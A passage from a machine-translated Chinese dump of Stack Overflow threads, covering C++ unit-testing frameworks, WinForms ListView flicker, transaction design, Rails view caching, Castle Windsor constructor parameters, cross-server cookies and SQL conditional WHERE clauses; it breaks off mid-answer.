试试[WinUnit](http://msdn.microsoft.com/en-us/magazine/cc136757.aspx)。听起来很棒，约翰·罗宾斯 ( [John Robbins](http://www.wintellect.com/cs/blogs/jrobbins/archive/2008/01/17/winunit-an-outstanding-native-c-unit-testing-tool.aspx) ) 推荐。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-09-17T22:13:03.100

我喜欢 Boost 单元测试框架，主要是因为它非常轻量级。

*   我从未听说过会生成存根的单元测试框架。我通常对代码生成非常不相信，只是因为它很快就过时了。当您有大量课程时，它可能会变得有用吗？

*   测试驱动开发的支持者可能会说，每次都运行整个测试套件是至关重要的，以确保您没有引入回归。如果运行所有测试花费了太多时间，可能是您的测试太大，或者对 CPU 密集型函数的调用过多而应该被模拟掉？如果它仍然是一个问题，围绕 boost 单元测试的薄包装应该允许您选择您的测试，并且可能比学习另一个框架并移植所有测试更快。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-09-17T21:29:39.960

[http://groups.google.com/group/googletestframework](http://groups.google.com/group/googletestframework)，但它很新

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2008-09-20T12:05:28.207

我正在使用[tut 框架](http://tut-framework.sourceforge.net/)

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2008-12-23T08:28:37.343

[Aeryn](http://sourceforge.net/projects/aeryn/)是另一个值得关注的框架

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2014-08-22T14:37:23.397

Visual Studio 有一个内置的单元测试框架，这是为 win32 控制台应用程序设置测试项目的一个很好的链接：

[http://codeketchup.blogspot.ie/2012/12/unit-test-for-unmanaged-c-in-visual.html](http://codeketchup.blogspot.ie/2012/12/unit-test-for-unmanaged-c-in-visual.html)

如果您正在处理静态 DLL 项目，则设置起来要容易得多，因为其他人指出 GTest 和 Boost 等外部测试框架具有额外的功能。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-12-26T18:28:20.593

[CppUnit](http://cppunit.sourceforge.net/doc/lastest/cppunit_cookbook.html)最初是对 JUnit 的致敬。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-09-17T21:30:05.823

Eclipse/JUnit 是一个可靠的 java 包，两者都有 C++ 扩展/等效项。它可以做你所说的。当然，你必须改变IDE......

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2008-09-17T21:36:54.827

我也是 UnitTest++ 的粉丝。

问题是源代码分发包含近 40 个单独的文件。这是荒谬的。管理一个简单项目的源代码控制和构建任务主要是管理所有这些单元测试文件。

我已修改 UnitTest++，以便通过添加一个 .h 和 .cpp 文件将其与项目集成。这被我称为“最可爱”。详情见[http://ravenspoint.com/blog/index.php?entry=entry080704-063557](http://ravenspoint.com/blog/index.php?entry=entry080704-063557)

它不会按照原始问题的要求自动生成测试存根。我不禁想到这样的功能会比它的价值更麻烦，会生成大量无用的代码“测试”访问器函数。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2008-09-17T22:40:17.840

我会想象自动存根测试函数将更像是一个函数（框架的脚本或）有问题的开发环境。假设 CodeGear 的 C++Builder 应用程序将快速生成用户功能的测试代码。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2011-03-15T06:03:02.040

Andrew Marlow 的果糖库值得一试... [http://fructose.sourceforge.net/](http://fructose.sourceforge.net/)

我记得他的文档包含在他编写 Fructose 时对其他产品的相当详细的分析和比较，但找不到直接指向该文档的 URL。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2014-02-20T20:17:56.147

我正在尝试[Igloo](https://github.com/joakimkarlsson/igloo)，它也是一个只有标头的 C++ 测试套件，即使它包含的两个依赖项也只是标头。

因此，它非常简单明了。除了 github 上包含的示例外，主站点[igloo-testing.org](http://igloo-testing.org/testrunner.html)上还有示例和更多详细信息。随着我对它和其他框架的更多经验，我稍后会更新它。

# c# - 更新单个 ListViewItem 的文本时如何防止 ListView 闪烁？

> ID：87795
> 
> 赞同：51
> 
> 时间：2008-09-17T21:21:47.030
> 
> 标签：c#, .net, winforms, listview

我想要的只是更新 ListViewItem 的文本而不会看到任何闪烁。

这是我的更新代码（多次调用）：

```
listView.BeginUpdate();
listViewItem.SubItems[0].Text = state.ToString();    // update the state
listViewItem.SubItems[1].Text = progress.ToString(); // update the progress
listView.EndUpdate(); 
```

我见过一些涉及覆盖组件的解决方案`WndProc():`

```
protected override void WndProc(ref Message m)
{
    if (m.Msg == (int)WM.WM_ERASEBKGND)
    {
        m.Msg = (int)IntPtr.Zero;
    }
    base.WndProc(ref m);
} 
```

**他们说它解决了问题，但在我的情况下它没有**。我相信这是因为我在每个项目上都使用了图标。

* * *

## 回答 #1

> 赞同：76
> 
> 时间：2013-03-07T10:11:07.240

接受的答案有效，但非常冗长，并且从控件派生（如其他答案中提到的）只是为了启用双缓冲也有点过头了。但幸运的是，我们有反射，如果我们愿意，也可以调用内部方法（但要确定你做了什么！）。

将这种方法封装到扩展方法中，我们将得到一个非常短的类：

```
public static class ControlExtensions
{
    public static void DoubleBuffering(this Control control, bool enable)
    {
        var method = typeof(Control).GetMethod("SetStyle", BindingFlags.Instance | BindingFlags.NonPublic);
        method.Invoke(control, new object[] { ControlStyles.OptimizedDoubleBuffer, enable });
    }
} 
```

可以在我们的代码中轻松调用：

```
InitializeComponent();

myListView.DoubleBuffering(true); //after the InitializeComponent(); 
```

所有的闪烁都消失了。

### 更新

我偶然发现了[这个问题](https://stackoverflow.com/questions/1967228/controlstyles-doublebuffer-vs-controlstyles-optimizeddoublebuffer)，由于这个事实，扩展方法应该（也许）更好地是：

```
public static void DoubleBuffered(this Control control, bool enable)
{
    var doubleBufferPropertyInfo = control.GetType().GetProperty("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic);
    doubleBufferPropertyInfo.SetValue(control, enable, null);
} 
```

* * *

## 回答 #2

> 赞同：52
> 
> 时间：2008-10-02T14:55:18.077

为了结束这个问题，这里有一个助手类，当为表单中的每个 ListView 或任何其他 ListView 的派生控件加载表单时，应该调用它。感谢“Brian Gillespie”提供解决方案。

```
public enum ListViewExtendedStyles
{
    /// <summary>
    /// LVS_EX_GRIDLINES
    /// </summary>
    GridLines = 0x00000001,
    /// <summary>
    /// LVS_EX_SUBITEMIMAGES
    /// </summary>
    SubItemImages = 0x00000002,
    /// <summary>
    /// LVS_EX_CHECKBOXES
    /// </summary>
    CheckBoxes = 0x00000004,
    /// <summary>
    /// LVS_EX_TRACKSELECT
    /// </summary>
    TrackSelect = 0x00000008,
    /// <summary>
    /// LVS_EX_HEADERDRAGDROP
    /// </summary>
    HeaderDragDrop = 0x00000010,
    /// <summary>
    /// LVS_EX_FULLROWSELECT
    /// </summary>
    FullRowSelect = 0x00000020,
    /// <summary>
    /// LVS_EX_ONECLICKACTIVATE
    /// </summary>
    OneClickActivate = 0x00000040,
    /// <summary>
    /// LVS_EX_TWOCLICKACTIVATE
    /// </summary>
    TwoClickActivate = 0x00000080,
    /// <summary>
    /// LVS_EX_FLATSB
    /// </summary>
    FlatsB = 0x00000100,
    /// <summary>
    /// LVS_EX_REGIONAL
    /// </summary>
    Regional = 0x00000200,
    /// <summary>
    /// LVS_EX_INFOTIP
    /// </summary>
    InfoTip = 0x00000400,
    /// <summary>
    /// LVS_EX_UNDERLINEHOT
    /// </summary>
    UnderlineHot = 0x00000800,
    /// <summary>
    /// LVS_EX_UNDERLINECOLD
    /// </summary>
    UnderlineCold = 0x00001000,
    /// <summary>
    /// LVS_EX_MULTIWORKAREAS
    /// </summary>
    MultilWorkAreas = 0x00002000,
    /// <summary>
    /// LVS_EX_LABELTIP
    /// </summary>
    LabelTip = 0x00004000,
    /// <summary>
    /// LVS_EX_BORDERSELECT
    /// </summary>
    BorderSelect = 0x00008000,
    /// <summary>
    /// LVS_EX_DOUBLEBUFFER
    /// </summary>
    DoubleBuffer = 0x00010000,
    /// <summary>
    /// LVS_EX_HIDELABELS
    /// </summary>
    HideLabels = 0x00020000,
    /// <summary>
    /// LVS_EX_SINGLEROW
    /// </summary>
    SingleRow = 0x00040000,
    /// <summary>
    /// LVS_EX_SNAPTOGRID
    /// </summary>
    SnapToGrid = 0x00080000,
    /// <summary>
    /// LVS_EX_SIMPLESELECT
    /// </summary>
    SimpleSelect = 0x00100000
}

public enum ListViewMessages
{
    First = 0x1000,
    SetExtendedStyle = (First + 54),
    GetExtendedStyle = (First + 55),
}

/// <summary>
/// Contains helper methods to change extended styles on ListView, including enabling double buffering.
/// Based on Giovanni Montrone's article on <see cref="http://www.codeproject.com/KB/list/listviewxp.aspx"/>
/// </summary>
public class ListViewHelper
{
    private ListViewHelper()
    {
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SendMessage(IntPtr handle, int messg, int wparam, int lparam);

    public static void SetExtendedStyle(Control control, ListViewExtendedStyles exStyle)
    {
        ListViewExtendedStyles styles;
        styles = (ListViewExtendedStyles)SendMessage(control.Handle, (int)ListViewMessages.GetExtendedStyle, 0, 0);
        styles |= exStyle;
        SendMessage(control.Handle, (int)ListViewMessages.SetExtendedStyle, 0, (int)styles);
    }

    public static void EnableDoubleBuffer(Control control)
    {
        ListViewExtendedStyles styles;
        // read current style
        styles = (ListViewExtendedStyles)SendMessage(control.Handle, (int)ListViewMessages.GetExtendedStyle, 0, 0);
        // enable double buffer and border select
        styles |= ListViewExtendedStyles.DoubleBuffer | ListViewExtendedStyles.BorderSelect;
        // write new style
        SendMessage(control.Handle, (int)ListViewMessages.SetExtendedStyle, 0, (int)styles);
    }
    public static void DisableDoubleBuffer(Control control)
    {
        ListViewExtendedStyles styles;
        // read current style
        styles = (ListViewExtendedStyles)SendMessage(control.Handle, (int)ListViewMessages.GetExtendedStyle, 0, 0);
        // disable double buffer and border select
        styles -= styles & ListViewExtendedStyles.DoubleBuffer;
        styles -= styles & ListViewExtendedStyles.BorderSelect;
        // write new style
        SendMessage(control.Handle, (int)ListViewMessages.SetExtendedStyle, 0, (int)styles);
    }
} 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2008-09-19T17:22:04.757

CommonControls 6（XP 或更新版本）中的 ListView 支持双缓冲。幸运的是，.NET 在系统上封装了最新的 CommonControls。若要启用双缓冲，请将适当的 Windows 消息发送到 ListView 控件。

以下是详细信息：http: [//www.codeproject.com/KB/list/listviewxp.aspx](http://www.codeproject.com/KB/list/listviewxp.aspx)

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2010-10-07T23:35:06.020

在 .NET Winforms 2.0 中存在一个名为 DoubleBuffered 的受保护属性。

通过从 ListView 继承，可以将此受保护的属性设置为 true。这将启用双缓冲，而无需调用 SendMessage。

设置 DoubleBuffered 属性与设置以下样式相同：

```
listview.SetStyle(ControlStyles.OptimizedDoubleBuffer | ControlStyles.AllPaintingInWmPaint, true); 
```

[http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=94096](http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=94096)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-04-03T19:58:10.233

我知道这个问题已经很老了，但是因为这是 Google 上的第一个搜索结果之一，所以我想分享我的修复方法。

我可以消除 100% 闪烁的唯一方法是结合 Oliver 的答案（带有双缓冲的扩展类）并使用`BeignUpdate()`and`EndUpdate()`方法。

Neither of those on their own could fix flickering for me. Granted, I use a very complex list, that I need to push into the list and also need to update it almost every sec.

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-27T14:26:27.280

这将有助于：

```
class DoubleBufferedListView : System.Windows.Forms.ListView
{
    public DoubleBufferedListView()
        :base()
    {
        this.DoubleBuffered = true;
    }
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-17T21:26:40.357

如果您只想更新文本，只需直接设置更改后的 SubItem 的文本，而不是更新整个 ListViewItem（您还没有说您是如何进行更新的）。

您显示的覆盖等同于简单地覆盖 OnPaintBackground，这将是执行该任务的“更正确”的托管方式，并且对单个项目没有帮助。

如果您仍有问题，我们需要澄清您实际尝试过的内容。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-09-17T21:27:57.827

这是在黑暗中拍摄的，但您可以尝试对控件进行双重缓冲。

```
SetStyle(
  ControlStyles.AllPaintingInWmPaint |
  ControlStyles.UserPaint |
  ControlStyles.DoubleBuffer, true) 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-09-18T16:08:27.077

在设置任何列表视图项之前调用 ListView 上的 BeginUpdate() 方法，然后仅在添加所有项后调用 EndUpdate()。

这将停止闪烁。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2014-08-20T09:51:08.947

## **简单的解决方案是这样的：**

yourlistview.BeginUpdate()

//更新从列表中添加和删除项目

yourlistview.EndUpdate()

# sql - 什么时候交易变得更像是一种负担而不是一种好处？

> ID：87796
> 
> 赞同：2
> 
> 时间：2008-09-17T21:21:56.297
> 
> 标签：sql, performance, design-patterns, transactions

在当今时代，事务性编程是现代开发的主要内容。并发性和容错性对于应用程序的寿命至关重要，因此，事务逻辑已变得易于实现。但是，随着应用程序的增长，事务代码似乎对应用程序的可伸缩性变得越来越沉重，当您桥接分布式事务和镜像数据集时，问题开始变得非常复杂。我很好奇，在数据大小或应用程序复杂性方面，事务经常开始成为问题的根源（导致超时、死锁、关键任务代码中的性能问题等），这些问题的修复、故障排除更麻烦或解决方法，而不是设计一个本身更容错的数据模型，或使用其他方式确保数据完整性。此外，哪些设计模式可以最大限度地减少这些影响或使标准事务逻辑过时或成为非问题？

--

编辑：到目前为止，我们已经得到了一些质量合理的答案，但我想我会自己发布一个答案，以提出我听说过的一些事情，试图激发一些额外的创造力；我得到的大部分回应都是对这个问题的悲观看法。

另一个重要的注意事项是，并非所有死锁都是由于程序编码不当造成的。有时，任务关键型操作依赖于不同顺序的相似资源，或者*不同*查询中的复杂连接相互叠加；这是一个有时似乎不可避免的问题，但我一直参与重新设计工作流程，以促进不太可能导致问题的执行顺序。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-17T21:30:26.680

我认为没有设计模式本身可以解决这个问题。良好的数据库设计、良好的存储过程编程，尤​​其是学习如何保持交易简短，将缓解大多数问题。但是，没有 100% 保证没有问题的方法。

不过，在我职业生涯中基本上遇到的每一种情况下，死锁和减速都是通过修复存储过程来解决的：

*   确保访问所有表以防止死锁
*   修复索引和统计信息使一切变得更快（因此减少了死锁的机会）
*   有时并没有真正需要交易，它只是“看起来”像它
*   有时可以通过在单个语句中创建多个语句存储过程来消除事务。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T21:34:08.700

从长远来看，使用共享资源是错误的。因为通过重用现有环境，您正在创造越来越多的可能性。只需回顾一下忙碌的海狸 :) Erlang 的方式是生成容错且易于验证的系统的正确方式。

但是事务性内存对于广泛使用的许多应用程序来说是必不可少的。例如，如果您咨询一家拥有数百万客户的银行，您不能仅仅为了效率而复制数据。

我认为单子是一个很酷的概念来处理改变状态的困难概念。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-19T16:24:23.023

One approach I've heard of is to make a versioned insert only model where no updates ever occur. During selects the version is used to select only the latest rows. One downside I know of with this approach is that the database can get rather large very quickly.

I also know that some solutions, such as FogBugz, don't use enforced foreign keys, which I believe would also help mitigate some of these problems because the SQL query plan can lock linked tables during selects or updates even if no data is changing in them, and if it's a highly contended table that gets locked it can increase the chance of DeadLock or Timeout.

I don't know much about these approaches though since I've never used them, so I assume there are pros and cons to each that I'm not aware of, as well as some other techniques I've never heard about.

I've also been looking into some of the material from Carlo Pescio's [recent post](http://www.eptacom.net/blog/2008/09/horizontal-scaling.html), which I've not had enough time to do it justice unfortunately, but the material seems very interesting.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T21:36:14.670

如果您在这里谈论“云计算”，答案是将每个事务本地化到它在云中发生的地方。

整个云不需要保持一致，因为这会降低性能（如您所述）。简单地说，跟踪更改的内容和位置，并在更改通过系统传播时处理多个小事务。

用户 A 更新记录 R 而云另一端的用户 B （尚未）看到它的情况与用户 A 在当前严格事务环境中尚未进行更改时的情况相同。这可能会导致更新繁重的系统出现差异，因此系统的架构应该尽可能少地处理更新——将事物转移到数据聚合中，并在确切数字至关重要时提取聚合（即移动一致性要求从写入时间到关键读取时间）。

好吧，只是我的POV。在这种情况下，很难想象一个与应用程序无关的系统。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T22:52:21.320

尝试以尽可能少的指令在数据库级别进行更改。

一般规则是尽可能少地锁定资源。在 Oracle 上使用 T-SQL、PLSQL、Java 或任何类似方式可以减少每个事务锁定共享资源的时间。事实上，数据库中的事务通过行级锁、多版本和其他类型的智能技术进行了优化。如果您可以在数据库中进行交易，则可以节省网络延迟。除了 ODBC/JDBC/OLEBD 等其他层。

有时程序员试图获取数据库的优点（它是事务性的、并行的、分布式的），但保留数据的缓存。然后他们需要手动添加一些数据库功能。

# ruby-on-rails - 为什么 Rails 在 VM 和 Samba 共享代码库上托管时缓存视图文件

> ID：87802
> 
> 赞同：2
> 
> 时间：2008-09-17T21:22:20.447
> 
> 标签：ruby-on-rails, caching

我有以下设置：

*   我的本地机器 (OS X) 上的代码共享为 Samba 共享
*   在 Parallels 中运行的 Ubuntu VM，挂载共享

在开发模式下运行 Rails 2.1（通过 Mongrel、WEBrick 或乘客），如果我更改我的视图，它们不会在我不必启动服务器的情况下更新。我已经尝试切换到 NFS 共享，但我遇到了同样的问题。我认为这是某种 Samba 缓存问题，但自动测试会立即获取对文件的更改。

笔记：

*   这不是渲染缓存或模板缓存，并且 config.action_view.cache_template_loading 未在开发配置中定义。
*   将代码库直接检出到 VM 不会显示相同的问题（但我不希望这样做）
*   直接在 VM 上编辑视图文件不能解决此问题。
*   更改后触摸视图文件确实会导致更改出现在浏览器中。
*   我还注意到虚拟机中的时钟快了一个小时，将其更改为正确的时间没有任何区别。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-11-20T09:21:24.697

在 andLinux 上开发时，我遇到了完全相同的问题。我的andLinux的时钟比主机Windows早了大约三个小时，设置正确的时间（实际上是晚了一分钟左右）已经解决了这个问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-17T22:12:40.777

实际上，在 VM 中设置正确的日期和时间似乎确实解决了问题（在我重新启动了 mongrel 之后）——需要做更多的挖掘工作。

# .net - Castle Windsor：如何从代码中指定构造函数参数？

> ID：87812
> 
> 赞同：11
> 
> 时间：2008-09-17T21:23:27.073
> 
> 标签：.net, castle-windsor

说我有以下课程

```
MyComponent : IMyComponent {
  public MyComponent(int start_at) {...}
} 
```

我可以通过xml向城堡温莎注册它的一个实例，如下所示

```
<component id="sample"  service="NS.IMyComponent, WindsorSample" type="NS.MyComponent, WindsorSample">  
  <parameters>  
    <start_at>1</start_at >  
  </parameters>  
</component> 
```

我将如何在代码中做完全相同的事情？（注意，构造函数参数）

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2008-09-18T14:59:08.923

编辑：使用流利界面​​的代码下面的答案:)

```
namespace WindsorSample
{
    using Castle.MicroKernel.Registration;
    using Castle.Windsor;
    using NUnit.Framework;
    using NUnit.Framework.SyntaxHelpers;

    public class MyComponent : IMyComponent
    {
        public MyComponent(int start_at)
        {
            this.Value = start_at;
        }

        public int Value { get; private set; }
    }

    public interface IMyComponent
    {
        int Value { get; }
    }

    [TestFixture]
    public class ConcreteImplFixture
    {
        [Test]
        void ResolvingConcreteImplShouldInitialiseValue()
        {
            IWindsorContainer container = new WindsorContainer();

            container.Register(
                Component.For<IMyComponent>()
                .ImplementedBy<MyComponent>()
                .Parameters(Parameter.ForKey("start_at").Eq("1")));

            Assert.That(container.Resolve<IMyComponent>().Value, Is.EqualTo(1));
        }

    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-10-14T14:30:42.963

试试这个

```
int start_at = 1; 
container.Register(Component.For().DependsOn(dependency: Dependency.OnValue(start_at))); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-11-07T01:12:21.807

您是否考虑过使用 Binsor 来配置您的容器？您可以使用基于 Boo 的 DSL 来配置 Windsor，而不是冗长和笨拙的 XML。这是您的配置的样子：

```
component IMyComponent, MyComponent:
   start_at = 1 
```

优点是您有一个可扩展的配置文件，但避免了 XML 的问题。此外，您不必像在代码中配置容器那样重新编译来更改配置。

还有很多辅助方法可以实现零摩擦配置：

```
 for type in Assembly.Load("MyApp").GetTypes():
    continue unless type.NameSpace == "MyApp.Services"
    continue if type.IsInterface or type.IsAbstract or type.GetInterfaces().Length == 0
    component type.GetInterfaces()[0], type 
```

您可以从[这里](http://ayende.com/Blog/category/451.aspx)开始。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T21:32:27.097

当您向容器请求实例时，您需要传入一个 IDictionary。

您将使用 IWindsorContainer 的此 Resolve 重载：

```
T Resolve<T>(IDictionary arguments) 
```

或非通用的：

```
object Resolve(Type service, IDictionary arguments) 
```

因此，例如：（假设容器是 IWindsorContainer）

```
IDictionary<string, object> values = new Dictionary<string, object>();
values["start_at"] = 1;
container.Resolve<IMyComponent>(values); 
```

请注意，字典中的键值区分大小写。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-04-17T16:15:11.630

您可以使用配置类来读取 app.config。然后注册它并让 windsor 将其用于其依赖项。理想情况下，我的 MyConfiguration 将使用接口。

```
public class MyConfiguration
{
    public long CacheSize { get; }

    public MyConfiguration()
    {
        CacheSize = ConfigurationManager.AppSettings["cachesize"].ToLong();
    }
}

container.Register(Component.For<MyConfiguration>().ImplementedBy<MyConfiguration>());

container.Register(Component.For<MostRecentlyUsedSet<long>>()
.ImplementedBy<MostRecentlyUsedSet<long>>().
DependsOn(Dependency.OnValue("size", container.Resolve<MyConfiguration>().CacheSize))
.LifestyleSingleton()); 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2008-09-18T15:11:44.603

您可以使用 IWindsorContainer 接口的 AddComponentWithProperties 方法来注册具有扩展属性的服务。

下面是使用 NUnit 单元测试执行此操作的“工作”示例。

```
namespace WindsorSample
{
    public class MyComponent : IMyComponent
    {
        public MyComponent(int start_at)
        {
            this.Value = start_at;
        }

        public int Value { get; private set; }
    }

    public interface IMyComponent
    {
        int Value { get; }
    }

    [TestFixture]
    public class ConcreteImplFixture
    {
        [Test]
        void ResolvingConcreteImplShouldInitialiseValue()
        {
            IWindsorContainer container = new WindsorContainer();
            IDictionary parameters = new Hashtable {{"start_at", 1}};

            container.AddComponentWithProperties("concrete", typeof(IMyComponent), typeof(MyComponent), parameters);

            IMyComponent resolvedComp = container.Resolve<IMyComponent>();

            Assert.That(resolvedComp.Value, Is.EqualTo(1));
        }

    }
} 
```

# .net - 在 php 页面中传递或读取 .net cookie

> ID：87818
> 
> 赞同：1
> 
> 时间：2008-09-17T21:23:59.990
> 
> 标签：.net, php, cookies, asp.net

嗨，我正在尝试找到一种方法来读取我在 .net Web 应用程序中生成的 cookie 以在 php 页面上读取它，因为我希望用户登录一次，但他们应该能够查看 .net 和 php 页面，直到cookie过期用户不需要再次登录，但是.net和php web应用程序都在不同的服务器上，请帮我解决这个问题，谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-09-17T22:03:01.033

你提到：

> 但是 .net 和 php Web 应用程序都在不同的服务器上

两个应用程序是否在同一个域名下运行？（即：www.mydomain.com）还是它们在不同的域上？

如果它们在同一个域上，那么您可以通过使用 $_COOKIE 变量来执行您在 PHP 中尝试执行的操作。只需通过以下方式获取 cookie 的值

```
$myCookie = $_COOKIE["cookie_name"]; 
```

然后你可以用 $myCookie 的值做任何你想做的事。

但是，如果它们位于不同的域（即：foo.mydomain.com 和 bar.mydomain.com）上，则您无法从两个站点访问 cookie。Web 浏览器只会向设置 cookie 的域上的页面发送 cookie。但是，如果您最初只使用顶级域 (mydomain.com) 设置 cookie，那么子域 (anything.mydomain.com) 应该能够读取 cookie。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-17T21:28:20.853

机器上的两台服务器是否在同一个域内？如果是这样，您应该将 cookie 范围设置为域而不是 FQDN；然后两台机器都可以读取它们；

```
Response.Cookies["domain"].Domain = "contoso.com"; 
```

将允许 contoso.com、www.contoso.com、hotnakedhamsters.contoso.com 等访问它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T21:26:06.740

任何提供给浏览器的 cookie 都可以被处理请求的服务器读取——它们与语言无关。

在 PHP 中尝试 $_COOKIE

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T21:28:15.797

只要站点相同（即 www.example.com），cookie 就与平台无关。正如 Todd Kennedy 所说，尝试超级全球 $_COOKIE。如果您的站点不同，但您将无法读取 cookie，则它们应该是特定于站点的，并防止这种类型的跨站点访问。

# sql - SQL：WHERE 子句中的 IF 子句

> ID：87821
> 
> 赞同：225
> 
> 时间：2008-09-17T21:24:49.380
> 
> 标签：sql, sql-server, tsql

是否可以在 MS SQL的**WHERE**子句中使用**IF**子句？

 **例子：

```
WHERE
    IF IsNumeric(@OrderNumber) = 1
        OrderNumber = @OrderNumber
    ELSE
        OrderNumber LIKE '%' + @OrderNumber + '%' 
```

* * *

## 回答 #1

> 赞同：240
> 
> 时间：2008-09-17T21:26:39.967

使用[CASE](http://msdn.microsoft.com/en-us/library/ms181765.aspx)语句
**更新：**以前的语法（正如一些人指出的那样）不起作用。您可以按如下方式使用 CASE：

```
WHERE OrderNumber LIKE
  CASE WHEN IsNumeric(@OrderNumber) = 1 THEN 
    @OrderNumber 
  ELSE
    '%' + @OrderNumber
  END 
```

或者您可以使用[@NJ Reed](https://stackoverflow.com/questions/87821/sql-if-clause-within-where-clause#87992)指出的 IF 语句。

* * *

## 回答 #2

> 赞同：154
> 
> 时间：2008-09-17T21:44:08.897

您应该能够在没有任何 IF 或 CASE 的情况下执行此操作

```
 WHERE 
   (IsNumeric(@OrderNumber) AND
      (CAST OrderNumber AS VARCHAR) = (CAST @OrderNumber AS VARCHAR)
 OR
   (NOT IsNumeric(@OrderNumber) AND
       OrderNumber LIKE ('%' + @OrderNumber)) 
```

根据 SQL 的风格，您可能需要根据是否支持隐式转换，将订单号的转换调整为 INT 或 VARCHAR。

这是 WHERE 子句中非常常见的技术。如果您想在 WHERE 子句中应用一些“IF”逻辑，您需要做的就是将带有布尔 AND 的额外条件添加到需要应用它的部分。

* * *

## 回答 #3

> 赞同：40
> 
> 时间：2016-01-22T13:57:16.210

您根本不需要 IF 语句。

```
WHERE
    (IsNumeric(@OrderNumber) = 1 AND OrderNumber = @OrderNumber)
OR (IsNumeric(@OrderNumber) = 0 AND OrderNumber LIKE '%' + @OrderNumber + '%') 
```

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2008-09-17T21:47:31.913

在 SQL 中没有很好的方法来做到这一点。我见过的一些方法：

1) 将 CASE 与布尔运算符结合使用：

```
WHERE
    OrderNumber = CASE 
        WHEN (IsNumeric(@OrderNumber) = 1)
        THEN CONVERT(INT, @OrderNumber)
        ELSE -9999 -- Some numeric value that just cannot exist in the column
    END
    OR 
    FirstName LIKE CASE
        WHEN (IsNumeric(@OrderNumber) = 0)
        THEN '%' + @OrderNumber
        ELSE ''
    END 
```

2) 在 SELECT 之外使用 IF

```
IF (IsNumeric(@OrderNumber)) = 1
BEGIN
    SELECT * FROM Table
    WHERE @OrderNumber = OrderNumber
END ELSE BEGIN
    SELECT * FROM Table
    WHERE OrderNumber LIKE '%' + @OrderNumber
END 
```

3) 使用长字符串，有条件地编写 SQL 语句，然后使用 EXEC

第三种方法是可怕的，但如果你有许多这样的可变条件，它几乎是唯一可行的方法。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-09-17T21:25:55.600

使用[CASE](http://msdn.microsoft.com/en-us/library/ms181765.aspx)语句而不是 IF。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-09-17T21:28:44.720

您想要 CASE 语句

```
WHERE OrderNumber LIKE
CASE WHEN IsNumeric(@OrderNumber)=1 THEN @OrderNumber ELSE '%' + @OrderNumber END 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2010-12-01T18:24:08.507

我认为 where...like/=...case...then... 可以与布尔值一起使用。我正在使用 T-SQL。

场景：假设如果 bool 为假，您想获得 Person-30 的爱好，如果 bool 为真，您想获得 Person-42 的爱好。（根据一些人的说法，爱好查找占业务计算周期的 90% 以上，因此请密切注意。）

```
CREATE PROCEDURE sp_Case
@bool   bit
AS
SELECT Person.Hobbies
FROM Person
WHERE Person.ID = 
    case @bool 
        when 0 
            then 30
        when 1
            then 42
    end; 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2020-12-24T14:22:25.170

// 使用存储过程选择按国家和站点过滤的用户的示例

```
CREATE STORED PROCEDURE GetUsers
@CountryId int = null,
@SiteId int = null
AS
BEGIN
SELECT *
        FROM Users
        WHERE
                CountryId  = CASE WHEN ISNUMERIC(@CountryId) = 1 THEN @CountryId ELSE CountryId END AND 
                SiteId     = CASE WHEN ISNUMERIC(@SiteId) = 1 THEN @SiteId ELSE SiteId END END 
```

> // 从输入 countryId 和/或 siteId 如果存在则不过滤

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2021-02-09T17:21:15.373

澄清一些逻辑等价的解决方案。

一个 if 语句

```
if (a) then b 
```

逻辑上等价于

```
(!a || b) 
```

[这是逻辑等价维基百科文章中](https://en.wikipedia.org/wiki/Logical_equivalence)**涉及条件语句**的逻辑等价部分的第一行。

要包含**else**，您要做的就是添加另一个条件

```
if(a) then b; 
if(!a) then c; 
```

这在逻辑上等价于 (!a || b) && (a || c)

因此以 OP 为例：

```
IF IsNumeric(@OrderNumber) = 1
    OrderNumber = @OrderNumber
ELSE
    OrderNumber LIKE '%' + @OrderNumber + '%' 
```

